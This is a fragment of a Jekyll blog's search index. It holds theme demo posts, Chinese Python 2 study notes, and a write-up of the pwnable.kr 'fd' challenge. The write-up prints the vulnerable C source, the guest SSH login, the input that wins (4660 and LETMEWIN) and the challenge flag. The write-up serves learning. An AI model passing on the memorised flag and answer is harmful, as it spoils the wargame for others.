        "title": "Markup: Syntax Highlighting",
        "excerpt":"Syntax highlighting is a feature that displays source code, in different colors and fonts according to the category of terms. This feature facilitates writing in a structured language such as a programming language or a markup language as both structures and syntax errors are visually distinct. Highlighting does not affect the meaning of the text itself; it is intended only for human readers.1   GFM Code Blocks   GitHub Flavored Markdown fenced code blocks are supported. To modify styling and highlight colors edit /_sass/syntax.scss.   #container {   float: left;   margin: 0 -240px 0 0;   width: 100%; }   .highlight {   margin: 0;   padding: 1em;   font-family: $monospace;   font-size: $type-size-7;   line-height: 1.8; }  &lt;nav class=\"pagination\" role=\"navigation\"&gt;   {% if page.previous %}     &lt;a href=\"{{ site.url }}{{ page.previous.url }}\" class=\"btn\" title=\"{{ page.previous.title }}\"&gt;Previous article&lt;/a&gt;   {% endif %}   {% if page.next %}     &lt;a href=\"{{ site.url }}{{ page.next.url }}\" class=\"btn\" title=\"{{ page.next.title }}\"&gt;Next article&lt;/a&gt;   {% endif %} &lt;/nav&gt;&lt;!-- /.pagination --&gt;   module Jekyll   class TagIndex &lt; Page     def initialize(site, base, dir, tag)       @site = site       @base = base       @dir = dir       @name = 'index.html'       self.process(@name)       self.read_yaml(File.join(base, '_layouts'), 'tag_index.html')       self.data['tag'] = tag       tag_title_prefix = site.config['tag_title_prefix'] || 'Tagged: '       tag_title_suffix = site.config['tag_title_suffix'] || '&amp;#8211;'       self.data['title'] = \"#{tag_title_prefix}#{tag}\"       self.data['description'] = \"An archive of posts tagged #{tag}.\"     end   end end   Code Blocks in Lists   Indentation matters. Be sure the indent of the code block aligns with the first non-space character after the list item marker (e.g., 1.). Usually this will mean indenting 3 spaces instead of 4.      Do step 1.        Now do this:       def print_hi(name)   puts \"Hi, #{name}\" end print_hi('Tom') #=&gt; prints 'Hi, Tom' to STDOUT.           Now you can do this.   Jekyll Highlight Tag   An example of a code blocking using Jekyll’s {% highlight %} tag.   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 'gulp html' -- does nothing  // 'gulp html --prod' -- minifies and gzips HTML files for production  gulp.task('html', () =&gt; {   return gulp.src(paths.siteFolderName + paths.htmlPattern)     .pipe(when(argv.prod, htmlmin({       removeComments: true,       collapseWhitespace: true,       collapseBooleanAttributes: false,       removeAttributeQuotes: false,       removeRedundantAttributes: false,       minifyJS: true,       minifyCSS: true     })))     .pipe(when(argv.prod, size({title: 'optimized HTML'})))     .pipe(when(argv.prod, gulp.dest(paths.siteFolderName)))     .pipe(when(argv.prod, gzip({append: true})))     .pipe(when(argv.prod, size({       title: 'gzipped HTML',       gzip: true     })))     .pipe(when(argv.prod, gulp.dest(paths.siteFolderName))) });   1 2 3 4 Module[{},   Sqrt[2]   4 ]   GitHub Gist Embed   An example of a Gist embed below.                    http://en.wikipedia.org/wiki/Syntax_highlighting &#8617;           ","categories": [],
        "tags": ["code","syntax highlighting"],
        "url": "https://zjgcjy.github.io/origin/2013-08-16-markup-syntax-highlighting/",
        "teaser":"https://zjgcjy.github.io/assets/images/markup-syntax-highlighting-teaser.jpg"},{
        "title": "Welcome to Jekyll!",
        "excerpt":"You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.   To add new posts, simply add a file in the _posts1 directory that follows the convention YYYY-MM-DD-name-of-post.ext and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.   Jekyll also offers powerful support for code snippets:   def print_hi(name)   puts \"Hi, #{name}\" end print_hi('Tom') #=&gt; prints 'Hi, Tom' to STDOUT.   Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk.                  Footnote test. &#8617;           ","categories": ["Jekyll"],
        "tags": ["update"],
        "url": "https://zjgcjy.github.io/origin/2016-02-24-welcome-to-jekyll/",
        "teaser":"https://farm5.staticflickr.com/4076/4940499208_b79b77fb0a_z.jpg"},{
        "title": "Layout: Header Video",
        "excerpt":"This post should display a header with a responsive video, if the theme supports it.   Settings                  Parameter       Required       Description                       id       Required       ID of the video                 provider       Required       Hosting provider of the video, either youtube or vimeo           YouTube   To embed the following YouTube video at url https://www.youtube.com/watch?v=XsxDH4HcOWA (long version) or https://youtu.be/XsxDH4HcOWA (short version) into a post or page’s main content you’d use:   {% include video id=\"XsxDH4HcOWA\" provider=\"youtube\" %}            To embed it as a video header you’d use the following YAML Front Matter   header:   video:     id: XsxDH4HcOWA     provider: youtube   Vimeo   To embed the following Vimeo video at url https://vimeo.com/212731897 into a post or page’s main content you’d use:   {% include video id=\"212731897\" provider=\"vimeo\" %}            To embed it as a video header you’d use the following YAML Front Matter   header:   video:     id: 212731897     provider: vimeo  ","categories": ["Layout","Uncategorized"],
        "tags": ["video","layout"],
        "url": "https://zjgcjy.github.io/origin/2017-01-23-layout-header-video/",
        "teaser":null},{
        "title": "test for zjgcjy",
        "excerpt":"   这里就可以使用markdown格式或其他格式写博客内容啦    h1   h2   h3   dsfdf   import zjgcjy   ","categories": ["test"],
        "tags": ["example"],
        "url": "https://zjgcjy.github.io/origin/2019-12-11-test/",
        "teaser":null},{
        "title": "Post: Future Date",
        "excerpt":"This post lives in the future and is dated Fri Dec 31 00:00:00 9999. When building Jekyll with the --future flag it should appear.  ","categories": ["Post"],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/2010-10-25-post-future-date/",
        "teaser":null},{
        "title": "Lhasa Apso",
        "excerpt":"   The Lhasa Apso (/ˈlɑːsə ˈæpsoʊ/ lah-sə ap-soh) is a non-sporting dog breed originating in Tibet. It was bred as an interior sentinel in the Buddhist monasteries, to alert the monks to any intruders who entered. Lhasa is the capital city of Tibet, and apso is a word in the Tibetan language meaning “bearded”, so, Lhasa Apso simply means “long-haired Lhasa dog”. There are, however, some who claim that the word “apso” is a form of the Tibetan word “rapso”, meaning “goat-like”, which would make the equivalent translation “wooly Lhasa dog”.       From Wikipedia, the free encyclopedia   ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/lhasa-apso/",
        "teaser":null},{
        "title": "Tabby",
        "excerpt":"   A tabby is any domestic cat that has a coat featuring distinctive stripes, dots, lines or swirling patterns, usually together with a mark resembling an ‘M’ on its forehead. Tabbies are sometimes erroneously assumed to be a cat breed. In fact, the tabby pattern is found in many breeds, as well as among the general mixed-breed population. The tabby pattern is a naturally occurring feature that may be related to the coloration of the domestic cat’s direct ancestor, the African wildcat, which (along with the European wildcat and Asiatic wildcat) has a similar coloration.       From Wikipedia, the free encyclopedia   ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin/tabby/",
        "teaser":null},{
        "title": "Baz Boom Identity",
        "excerpt":"Pictures of Goats section West Seattle Blog dingbat newspaper rubber cement Google+ newsroom cafe news.me rubber cement, Ushahidi Kindle Single syndicated Instagram HuffPo community mthomps, Mozilla iPhone app should isn’t a business model curmudgeon Snarkmarket Tim Carmody production of innocence. Fuego tweets community DocumentCloud metered model Gardening &amp; War section YouTube social media SEO information overload analytics Aron Pilhofer Journal Register data visualization WikiLeaks Groupon, collaboration Steve Jobs we need a Nate Silver AP What Would Google Do the power of the press belongs to the person who owns one Clay Shirky curmudgeon Voice of San Diego free as in beer dead trees the notion of the public Lucius Nieman.                                                                                                                          This is a sample gallery to go along with this case study.       hackgate copyright Lucius Nieman CNN leaves it there right-sizing a giant stack of newspapers that you’ll never read net neutrality algorithms RT algorithms TechCrunch 5% corruption, horse-race coverage Gardening &amp; War section CTR try PR CPC David Cohn shoot a photo algorithms content is king Android Snarkmarket crowdfunding, Fuego Twitter topples dictators YouTube abundance WordPress Reuters try PR stupid commenters should isn’t a business model bringing a tote bag to a knife fight.  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin_other/baz-boom-identity/",
        "teaser":"https://zjgcjy.github.io/assets/images/unsplash-gallery-image-1-th.jpg"},{
        "title": "Fizz Bang Identity",
        "excerpt":"Pictures of Goats section West Seattle Blog dingbat newspaper rubber cement Google+ newsroom cafe news.me rubber cement, Ushahidi Kindle Single syndicated Instagram HuffPo community mthomps, Mozilla iPhone app should isn’t a business model curmudgeon Snarkmarket Tim Carmody production of innocence. Fuego tweets community DocumentCloud metered model Gardening &amp; War section YouTube social media SEO information overload analytics Aron Pilhofer Journal Register data visualization WikiLeaks Groupon, collaboration Steve Jobs we need a Nate Silver AP What Would Google Do the power of the press belongs to the person who owns one Clay Shirky curmudgeon Voice of San Diego free as in beer dead trees the notion of the public Lucius Nieman.                                                                                                                          This is a sample gallery to go along with this case study.       hackgate copyright Lucius Nieman CNN leaves it there right-sizing a giant stack of newspapers that you’ll never read net neutrality algorithms RT algorithms TechCrunch 5% corruption, horse-race coverage Gardening &amp; War section CTR try PR CPC David Cohn shoot a photo algorithms content is king Android Snarkmarket crowdfunding, Fuego Twitter topples dictators YouTube abundance WordPress Reuters try PR stupid commenters should isn’t a business model bringing a tote bag to a knife fight.  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin_other/fizz-bang-identity/",
        "teaser":"https://zjgcjy.github.io/assets/images/unsplash-gallery-image-2-th.jpg"},{
        "title": "Foo Bar Identity",
        "excerpt":"Pictures of Goats section West Seattle Blog dingbat newspaper rubber cement Google+ newsroom cafe news.me rubber cement, Ushahidi Kindle Single syndicated Instagram HuffPo community mthomps, Mozilla iPhone app should isn’t a business model curmudgeon Snarkmarket Tim Carmody production of innocence. Fuego tweets community DocumentCloud metered model Gardening &amp; War section YouTube social media SEO information overload analytics Aron Pilhofer Journal Register data visualization WikiLeaks Groupon, collaboration Steve Jobs we need a Nate Silver AP What Would Google Do the power of the press belongs to the person who owns one Clay Shirky curmudgeon Voice of San Diego free as in beer dead trees the notion of the public Lucius Nieman.                                                                                                                          This is a sample gallery to go along with this case study.       hackgate copyright Lucius Nieman CNN leaves it there right-sizing a giant stack of newspapers that you’ll never read net neutrality algorithms RT algorithms TechCrunch 5% corruption, horse-race coverage Gardening &amp; War section CTR try PR CPC David Cohn shoot a photo algorithms content is king Android Snarkmarket crowdfunding, Fuego Twitter topples dictators YouTube abundance WordPress Reuters try PR stupid commenters should isn’t a business model bringing a tote bag to a knife fight.  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin_other/foo-bar-website/",
        "teaser":"https://zjgcjy.github.io/assets/images/foo-bar-identity-th.jpg"},{
        "title": "Ginger Gulp Identity",
        "excerpt":"Pictures of Goats section West Seattle Blog dingbat newspaper rubber cement Google+ newsroom cafe news.me rubber cement, Ushahidi Kindle Single syndicated Instagram HuffPo community mthomps, Mozilla iPhone app should isn’t a business model curmudgeon Snarkmarket Tim Carmody production of innocence. Fuego tweets community DocumentCloud metered model Gardening &amp; War section YouTube social media SEO information overload analytics Aron Pilhofer Journal Register data visualization WikiLeaks Groupon, collaboration Steve Jobs we need a Nate Silver AP What Would Google Do the power of the press belongs to the person who owns one Clay Shirky curmudgeon Voice of San Diego free as in beer dead trees the notion of the public Lucius Nieman.                                                                                                                          This is a sample gallery to go along with this case study.       hackgate copyright Lucius Nieman CNN leaves it there right-sizing a giant stack of newspapers that you’ll never read net neutrality algorithms RT algorithms TechCrunch 5% corruption, horse-race coverage Gardening &amp; War section CTR try PR CPC David Cohn shoot a photo algorithms content is king Android Snarkmarket crowdfunding, Fuego Twitter topples dictators YouTube abundance WordPress Reuters try PR stupid commenters should isn’t a business model bringing a tote bag to a knife fight.  ","categories": [],
        "tags": [],
        "url": "https://zjgcjy.github.io/origin_other/ginger-gulp-identity/",
        "teaser":"https://zjgcjy.github.io/assets/images/unsplash-gallery-image-3-th.jpg"},{
        "title": "Python2 Learning 1",
        "excerpt":"     python作为一种胶水语言（脚本语言），其丰富的拓展性和易用性使其在很多方面非常有优势，到现在我还没有正式学过python，以下是学习笔记，留作备用，常回来看看。    基础知识   python文件一般拓展名位py，如果是GUI程序则可以保存位pyw文件，pyc则是加密过的。   使用pip管理pyhton拓展库   关于pip的使用与拓展库的安装可以查看一起写的一篇文章，不在赘述。   查看版本：   import sys print sys.version   #查看版本 print sys.version_info  #同上 print sys.winver  #同上   内置对象与函数   python内置对象，内置函数有很多，如 数字，文件，字符串，集合，列表，字典，元组，布尔、空类型，编程单元类型， 其中 列表和字典属于可变序列。 字符串和元组属于不可变序列。试图修改时，将抛出异常。   type()函数用来返回变量类型。print type(x)  isinstance()用来测试对象是否为指定的类型的实例。print isinstance(‘hello world’,int)  id()用来查看变量的内存地址 print id(x)   列表用[]，类似于C++里面的数组；元组用()，不可修改   x=[1,2,3,] print x   #[1,2,3] print x[0]  #1   内存管理   python采用的基于值的内存管理方式，多个变量可以对应同一个值，即同一个内存地址，修改变量的值并不是修改变量本身，而是修改变量指针的内存地址的值，当两个变量的值相同时，id()得到的是相同的。变量的命名不能是关键字，可以通过 print keyword.kwlist查看所有关键字。   数字   python可以表示大数。 0x表示16进制，0o表示8进制，0b表示2进制。可以使用j或者J表示复数。x.real x.imag x.conjugate分别求实部，虚部，共轭复数。   常用表达式与函数   x/y 除法（python3中是真除法） -x  取反 |、^、&amp;、«、»、~ 位运算符   bin(x) 把数字转换成二进制 chr(x) 把数字转换成ASCII码 hex(x) 把数字转换成十六进制 int(x) 把数字转换成十进制 ord(x) 把字符转成数字 str(obj)把对象转换成字符串 len(obj)求元素个数 dir(x)返回对象的成员列表 help(obj)获取帮助信息   关于输入输出   使用input()接受键盘输入，x=input(‘please input’)，在python2中根据界定符决定变量的类型；在python3中input返回的均是str字符串类型，相当于python2中的raw_input()函数。python2中使用print语句输出，python3中使用print()函数输出。   重定向   #python2 fp=open(r'h:/mytext.txt','w')    #r表示原始字符串，\\之后的不进行转义 print&gt;&gt;fp,'hello world' fp.close() #python3 fp=open('h://mytext.txt','a+') print('hello world',file=fp) fp.close()   输出不换行   #可以使用续行符\\来换行 #python2 for i in range(10):     print i, #python3 for i in range(1,10):     print(i,end=' ')   导入模块   模块导入有两种方式。   import  模块名 [as 别名]   使用时需要加上模块名的前缀进行访问。   from 模块名 import 对象名 [as 别名]   仅导入需要的对象，并且可以起别名，不需要前缀。 也可以一次导入模块中所有的对象。 from 模块名 import * 模板导入的顺序需要遵循一下的规则1.标准模板库2.第三方模板库3.自定义模板库   python的__name__属性   每个python脚本执行的时候都有一个__name__属性，当其作为文件独立执行的时候__name__等于__main__，但当其作为模块导入其他时__name__被自动设置为模块名。   python程序框架生产器   用法 python codefreamework.py  newfile.py   # -*- coding: cp936 -*- import os import sys import datetime  head='#'+'-'*20+'\\n'+\\      '#Function description:\\n'+\\      '#'+'-'*20+'\\n'+\\      '#Author: Chen JiaYu\\n'+\\      '#QQ: 1169348492\\n'+\\      '#Email: zjgcjy@gmail.com\\n'+\\      '#'+'-'*20+'\\n' desFile=sys.argv[1]     #目标文件名字 e.g newfile.py if os.path.exists(desFile) or not desFile.endswith('.py'):     print '%s already exist or is not a Python code file.!'%desFile     sys.exit() fp=open(desFile,'w') today=str(datetime.date.today()) fp.write('#-*-coding:utf-8 -*-\\n') fp.write('#Filename:'+desFile+'\\n') fp.write(head) fp.write('#Date:'+today+'\\n') fp.write('#'+'-'*20+'\\n') fp.close()  ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-1.html",
        "teaser":null},{
        "title": "Python2 Learning 2",
        "excerpt":"     第二单元，主要学习的是python的序列，包括 列表，元组，字典，字符串，集合。    列表   列表是可变序列，使用方括号，元素使用逗号分开，元素类型可以是基本或者自定义类型。                  方法       说明                       list.appeng(x)       将x添加到尾部                 list.extend(L)       将列表L所有元素添加到尾部                 list.insert(index,x)       在index处插入元素x                 list.index(x)       求出元素x所在下标                 list.count(x)       统计x出现的次数                 list.reverse()       求列表逆序                 list.sort()       对列表排序           列表创建   list=[]     #创建空列表 list('hello world')     #使用list函数转换列表   range()函数用法：range(start，stop，step)分别是初始值（默认是0），终止值，步长，返回是列表。也可以用xrange()，返回的是对象。 range()=list(xrange())   列表增加   使用+运算符   最简单可以直接使用list=list+new element，速度太慢，效率低。   使用append()   list.append(i)   使用extend()   使用extend()可以将另一个列表添加到该列表尾部。 list.extend([1,2,3,4])   使用insert(index,x)   可以将x添加到下标为index处。   使用乘法来拓展   list=list3，但实际是创建了一个新的列表，不是真正的拓展。 当运算的列表中还有列表的时候，并不是创建复制，而是对象的引用。当原值被修改的时候，引用也会被修改。   成员资格判断   可以使用count()函数，求出出现的次数，次数&gt;0即为存在。也可以使用in关键字。   # -*- coding: utf8 -*- alist=[] alist=list(xrange(10)) print alist print 11 in alist       #False  #关于in关键字的小程序 # -*- coding: utf8 -*- alist=[] alist=list(xrange(10)) print alist blist=[] blist=list(xrange(ord('a'),ord('a')+10)) for i in range(len(blist)):     blist[i]=chr(blist[i]) print blist for a,b in zip(alist,blist):        #将多个对象整合成元组     print a,b   切片操作   切片使用两个: 第一个是开始位置，默认是0；第二个是截至位置，默认是最后；第三个是步长，默认是1。   alist=[1,2,3,4,5] print alist[::-1]       #倒序输出 alist[::]       #整个列表 #使用切片来增加元素 alist=[] for i in xrange(10):     alist[len(alist):]=[i] print alist   列表排序   有随机排序，顺序排序，逆序排序，自定义排序。一般通过列表的方法sort()来对列表进行修改，也可以使用内置函数sorted()进行排序，但是返回一个新的列表。   #随机排序 import random alist=[] for i in xrange(10):     alist[len(alist):]=[i] random.shuffle(alist) print alist #逆序sort方法 alist.sort(reverse=True) print alist #逆序sorted函数 sorted(alist,reverse=True) print alist   一些内置函数   max(alist)求最大元素 min(alist)求最小元素 sum(alist)求和 zip(alist,blist)将两个列表对应位置组合为元组 enumerate(alist)枚举列表，返回枚举对象，包含元素下标和元素的值   for i in enumerate(alist):     print i, print '\\n' for i,c in enumerate(alist):     print (i,c), for i in enumerate(zip(v_tuple,alist)):     print i,   列表推导式   使用列表推导式可以使得代码有非常强的可读性。其结构均采用 [ a for b in c ( if function 满足 ) ] 表示 只要b在c中，如果判断满足，则每次在列表中增加a   #随机初始化列表 import random alist=[random.randint(0,10) for i in xrange(10)] print alist #读取当前目录下所有的py文件 import os blist=[filename for filename in os.listdir('.') if filename.endswith('.py')] print blist #生成数组(一维数组) clist=[(x,y) for x in xrange(3) for y in xrange(3)] print clist #实现矩阵转置(二维数组) matrix=[[random.randint(0,10) for i in xrange(4)] for i in xrange(3)] print matrix matrix_zz=[[row[i] for row in matrix] for i in xrange(4)] print matrix_zz   元组   元组属于不可变序列，如果要修改，之恩那个重修创建一个新的元组。使用小括号 ( ) 来定义元组。 元组的访问速度比列表快，所以如果不对元素进行修改，可以将对象定义为元组，同时对数据进行了写保护。 元组可以作为字典的键，列表不行。   元组创建   关于元组的创建，和列表差不多，用小括号就行了，如果就一个元素，之后必须带上一个逗号。 同list()一样，可以使用tuple()将对象转换成元组。   #元组创建，使用tuple() alist=[i for i in xrange(10)] print alist alist=tuple(alist) print alist   关于删除，列表可以用del删除部分元素，由于元组不可变，所有只能用del删除整个元组。   序列解包   将列表，元组，字典一次性赋值给多个变量。   #元组 v_tuple=(False,3.6666666,'exp') x,y,z=v_tuple print x,y,z   对字典操作时，默认是对键操作；使用字典的items()方法可以对键-值操作；使用value()方法可以对值操作。并且对字典操作的时候不考虑顺序。   #列表 alist=[i for i in xrange(10)] x,y,z=alist[:3] print x,y,z #字典，不考虑顺序 dic={'a':1,'b':2,'c':3} #键 x,y,z=dic print x,y,z #键-值 x,y,z=dic.items() print x,y,z #值 x,y,z=dic.values() print x,y,z   调用函数时，在实参前加一个*也可以进行序列解包，可以将实参传递依次传递给相同数量的形参。   生成器推导式   与列表推导式差不多，使用小括号，推导的结果是生成器对象，不是列表、元组。但可以使用list()、tuple()进行转换；也可以使用生成器对象的（python2 :next()方法、python3:__next()__方法），进行遍历。特别的是，该对象只能用一次。   g=(i**2 for i in xrange(10)) alist=list(g) print alist #对象只能用一次，所以没有值 v_tuple=tuple(g) print v_tuple #直接循环迭代 g_=(i**2 for i in xrange(10)) for i in g_:     print i, #等价于:(python2) for i in xrange(10): print g_.next(),   字典   字典是 键-值的无序可变序列。每个键和值使用:分开，相邻元素使用,分开。使用大括号定义。字典中的键是不可变的且不允许重复。   内置函数   globals()查看全局变量，返回字典。 locals()查看局部变量，返回字典。   创建与读取   直接赋值，或者使用dict()根据键-值来创建。   alist=list(chr(ord('a')+i) for i in xrange(10)) print alist values=tuple(i**2 for i in xrange(10)) print values dictionary=dict(zip(alist,values)) print dictionary   读取可以使用dictionary[键]的方式读某一个值，也可以用get(key)来读取并修改元素。删除可以用del语句，或者clear()全删除。 使用item()、 keys()、 values()方法可以读取键-值、键、值。   for i in dictionary.items():     print i, for i in dictionary.keys():     print i, for i in dictionary.values():     print i,   集合   集合是无序可变序列，使用大括号，和字典一样。元素不可重复。   集合操作   可以使用set()将对象转换成集合，add()用于添加元素，del语句用于删除整个集合， remove(x)用于删除指定元素。 并集：a.union(b)      a|b 交集：a.intersection(b)    a&amp;b 差集：a.difference(b)      a-b 对称差：a.symmetric_difference(b)       a^b 是否子集：a.issubset(b) 用途： 使用set()可以快速求出序列中所有的不重复元素。  ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-2.html",
        "teaser":null},{
        "title": "Python2 Learning 3",
        "excerpt":"     选择与循环结构    选择结构   单分支：没什么好讲的。 双分支：和C/C++/Java差不多。   if condition:     a else:     b   也可以写成以下形式： value1 if condition else value2 如果条件满足，表达式值为value1，否则为value2   print 6 if 3&lt;2 else 5 b=6 if a&gt;13 else 9   多分支：   if condition1:     a elif condition2:     b elif condition3:     c     .     .     . else:     n   循环结构   while condition:     a for i in 序列或其他迭代对象:     b   while 和 for可以带else子句，如果循环条件表达式不成立，就执行else中的语句，break语句导致的结束不执行else语句。   #求100以内的素数 for n in xrange(1,100):     for i in xrange(2,n):         if n%i==0:             break     else:         print n #求1到100数之和 for i in xrange(1,101):     s+=i print s  #求组合数C(n，i)  def Cni(n,i):     if not (isinstance(n,int) and isinstance(i,int) and n&gt;=i ):         print \"n and i must be integers\"         return     result=1     Min,Max=min(i,n-1),min(i,n-i)     for i in xrange(n,0,-1):         if i&gt;Max:             result*=i         elif i&lt;=Min:             result/=i     return result   ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-3.html",
        "teaser":null},{
        "title": "Python2 Learning 4",
        "excerpt":"     字符串与正则表达式    编码格式   常见的编码格式有：ASCII,UTF-8,GB2312,GBK,CP936。GB2312是我国制定的中文编码标准，GBK是其拓展，CP936是Microsoft公司开发的编码，均使用2byte表示中文，UTF-8使用3byte，python2中input()默认输入方式是GBK编码。   字符串   python中字符串属于不可变序列。关于格式化字符串，格式为： ‘% 格式字符’ % 表达式，其中%s为字符串，%c为单个字符，%d为十进制，%o为八进制，%x为十六进制，%f为浮点数。也可以用format()方法来格式化   字符串方法   find()在一个字符串中查找另一个字符串出现的位置，rfind()从后向前找。 index()在一个字符串中查找另一个字符串首次出现位置，rindex()最后出现位置，count()统计字符串出现次数。 split()用指定字符分割字符串，rsplit()从后往前分割；partition()以指定字符分割3部分，分隔符前的字符串，分隔符，分隔符后的字符串。rpartition()从后往前。 join()将多个字符串拼接   sep=':' s=sep.join(string)   lower()字符串转小写，upper()字符串转大写，capitalize()首字母大写，title()每个单词首字母大写，swapcase()大小写转换。 replace()替换字符串，string=s.replace(‘old’,’new’) maketrans()生成字符映射表，translate()进行转换。   import string s=\"abcdefghijklmnopqrstuvwxyz\" table=string.maketrans('abc','123') print s.translate(table)   strip()用来删除指定字符，rstrip()删除右边指定字符，lstrip()删除左边指定字符。 eval()将字符串转换为python表达式进行求值。  ","categories": ["Coding"],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-4.html",
        "teaser":null},{
        "title": "Python2 Learning 5",
        "excerpt":"  函数设计与使用   定义与参数   格式如下，并允许函数嵌套定义，必要时需写注释。当参数是可变序列时，在函数内部对序列进行的修改会反应到函数外。参数有普通参数，默认参数，关键参数，可变长度参数等。   def f([参数]):     '''注释'''     函数体   可变长度参数   有两种形式： *parameter 和**parameter，前者用于将多个实参放在一个元组中；后者则使用关键参数显式赋值存于字典。    def demo(*p):     print p demo(1,2,3)  def demo(**p):     for item in p:         print item demo(x=1,y=2,z=3)   关于return：调用函数时要注意函数是否有返回值。   变量作用域   在函数内部，如果只引用某个变量而没有赋值，则是隐式全局变量；如果修改过，则是隐式局部变量；如果声明global，则是显式全局变量。 如果需要在多个模块中共享全局变量，则可以将需要访问的变量所在模块导入，通过模块.变量方式进行访问。  ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-5.html",
        "teaser":null},{
        "title": "Python2 Learning 6",
        "excerpt":"  关于文件操作，SEH和其他（由于一些不可抗力因素，写的很少，python作为工具还是很棒的）   文件操作   文件对象名=open(文件名,打开方式)，完成操作后，必须关闭文件，保证所做的修改得到保存。 r读模式w写模式a追加模式b二进制模式+读写模式。 常用方法：readlines()每行文本作为字符串存入列表并返回。   SEH   try……except结构   try后跟可能出现异常的语句 except后跟原因，处理异常。   try……except……else结构   try后没用异常，则执行else中的语句   try……except……finally结构   无论是否发生异常，finally总会执行。   断言和上下文管理   assert expression 当expression真时，什么也不做；否则抛出异常 通常和SEH结合使用 with语句可以自动管理资源，在代码块结束后，自动还原进入该代码块之前的现场或上下文，总能保证资源正常释放。 with context_expr  ","categories": [],
        "tags": ["python2"],
        "url": "https://zjgcjy.github.io/posts/2017-07/python2-learning-6.html",
        "teaser":null},{
        "title": "Pwnable刷题 1",
        "excerpt":"     现在要向pwn方向发展了，前几天看了klee和angr的自动化bin分析框架，人工智能的发展，ctf比赛也涌现了自动化工具的身影，这么说呢，Windows前景可能没有那么好了吧，毕竟比赛和现实的差距比较大。往往逆向的工程都比较大，个人是无法短期完成的，转到pwn上也是算更深入底层了吧，现在算是放弃C++了，主要还是C、ASM、Java，脚本的话主要是python，道理都懂得，加油吧。    现在在做pwnable上的题目，其他有2个平台挂了，很尴尬做不了，先刷pwnable吧。   题目:fd   Mommy! what is a file descriptor in Linux? 妈妈，在Linux中文件描述符是什么？      try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU   ssh fd@pwnable.kr -p2222 (pw:guest)   writeup   先用ssh登陆上去，查看目录   fd@ubuntu:~$ ls fd  fd.c  flag   发现有flag文件，但是cat flag打不开，有权限保护。 运行fd文件，加参数运行，提示：learn about Linux file IO 既然有C文件的哈，先看看再说。   #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]) {     if(argc&lt;2){             printf(\"pass argv[1] a number\\n\");             return 0;     }     int fd = atoi( argv[1] ) - 0x1234;     int len = 0;     len = read(fd, buf, 32);     if(!strcmp(\"LETMEWIN\\n\", buf)){             printf(\"good job :)\\n\");             system(\"/bin/cat flag\");             exit(0);     }     printf(\"learn about Linux file IO\\n\");     return 0; }   解释：      atoi (表示 ascii to integer)是把字符串转换成整型数的一个函数，atoi( ) 函数会扫描参数 nptr字符串，跳过前面的空白字符，空格，tab缩进等。   内核（kernel）利用文件描述符（file descriptor）来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。   习惯上，标准输入（standard input）的文件描述符是 0，标准输出（standard output）是 1，标准错误（standard error）是 2。   read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或无可读取的数据。错误返回-1,并将根据不同的错误原因适当的设置错误码。   在一般的 linux 系统当中（例外如 FreeBSD,OpenBSD 等），使用 sh 调用执行脚本相当于打开了bash 的 POSIX 标准模式 也就是说 /bin/sh 相当于 /bin/bash –posix   /bin/cat flag 执行bin目录下cat程序，参数为当前目录下flag文件。   system是一个C语言和C++下的函数。windows操作系统下system () 函数详解主要是在C语言中的应用，system函数需加头文件后方可调用。   为达到利用，先使得文件描述符可以工作，fd=0，参数为0x1234的十进制4660，再输入LETMEWIN，比较成功，获取flag。   system函数：在程序中，使用system函数便有管理员权限。原型：int system(const char * command)；功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；头文件：stdlib.h；返回值：命令执行成功返回0，执行失败返回-1。   fd@ubuntu:~$ ./fd 4660 LETMEWIN good job :) mommy! I think I know what a file descriptor is!!   flag:mommy! I think I know what a file descriptor is!!  ","categories": [],
        "tags": ["pwn","pwnable"],
        "url": "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-1.html",
        "teaser":null},{
        "title": "Pwnable刷题 7",
